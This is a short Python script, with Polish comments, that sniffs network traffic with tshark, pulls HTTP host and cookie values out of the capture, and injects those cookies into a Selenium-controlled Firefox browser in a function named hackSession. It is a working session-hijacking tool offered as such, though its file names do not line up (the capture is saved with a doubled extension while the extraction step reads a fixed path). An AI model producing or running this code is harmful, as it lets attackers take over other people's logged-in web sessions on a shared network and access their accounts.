import os
from selenium import webdriver

def makeCookiesDictionary(fileName):
	cookiesFile = open(fileName,'r')
	cookiesDict = dict()
	for line in cookiesFile:
		line = line.replace(";","") 
		line = line.split()
		host = 'http://' + line[0] 
		cookies = line[1:]
		if host not in cookiesDict:
			cookiesDict[host] = dict()
		for cookie in cookies:
			cookie = cookie.split("=")
			cookiesDict[host][cookie[0]] = cookie[1]
	return cookiesDict

def sharkPackets(seconds,fileName):
	"""
	Lapie pakiety w sieci w ciagu okreslonego czasu oraz zapisje ich w plik fileName
	"""
	os.system('tshark -a duration:%d -w %s.psap' % (seconds, fileName)) 


def extractCookies(inputFile, outputFilie):
	"""
	 wczytuje plik inputFile, wyszukuje pola http.host oraz http.cookie w protokolu http oraz zapisuje dane w plik outputFile
	
	"""
	os.system('tshark -r ./packs.psap -T fields -e http.host -e http.cookie -Y http.cookie > cookies.txt') 

def hackSession(driver,cookiesDict):
	for host in cookiesDict:
		driver.get(host)
		for cookieKey in cookiesDict[host]:		
			cookie = dict()
			cookie['name'] = cookieKey
			cookie['value'] = cookiesDict[host][cookieKey]
			cookie['path'] = "/"
			driver.add_cookie(cookie)	


sharkPackets(10,'packs.psap')
extractCookies('packs.psap', 'cookies.txt')
cookiesDict = makeCookiesDictionary('cookies.txt') # { host : [cookies] }
driver = webdriver.Firefox(executable_path='/usr/local/bin/geckodriver')
hackSession(driver,cookiesDict)

		

